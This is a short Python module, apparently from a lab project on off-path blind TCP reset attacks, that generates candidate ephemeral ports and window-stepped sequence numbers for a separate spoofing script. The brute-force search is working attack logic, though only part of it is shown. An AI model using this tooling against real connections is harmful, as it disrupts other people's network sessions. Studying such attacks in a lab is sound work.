"""
infer_tuple.py  —  Model the OFF-PATH "blind" constraint (report Phase 3).
Owner: ANISA

The attacker knows: client IP, server IP, server port (well-known).
The attacker does NOT know: the client's ephemeral source port, and (Attack 1)
an in-window sequence number. So we BRUTE-FORCE over the plausible space and
send one spoofed packet per guess.

This file only produces the guesses. The actual send happens in blind_reset.py.
Keep it a generator so callers can stop as soon as the connection dies.
"""

from common import config


def candidate_ports():
    """Yield every ephemeral source port the client might have used (§Phase 3)."""
    lo, hi = config.CLIENT_PORT_RANGE
    for port in range(lo, hi + 1):
        yield port
    # NOTE: ~28k ports. Report should discuss packet-rate cost vs. success
    # probability here (RFC 5927 §5-6). TODO(Anisa): add a --step to sample.


def candidate_seqs():
    """
    Yield sequence numbers to try so one lands in [SND.UNA, SND.NXT] (§3.2).
    The 32-bit space is huge, so we jump by the receive-window size instead of
    trying every value — one guess per window is enough to fall inside it.
    """
    WINDOW = 65535
    seq = 0
    while seq < 2**32:
        yield seq
        seq += WINDOW
    # TODO(Anisa): on the custom-5.15 kernel the check is relaxed, so a single
    # seq (e.g. 0) is enough — keep this loop only for the stock-kernel contrast.
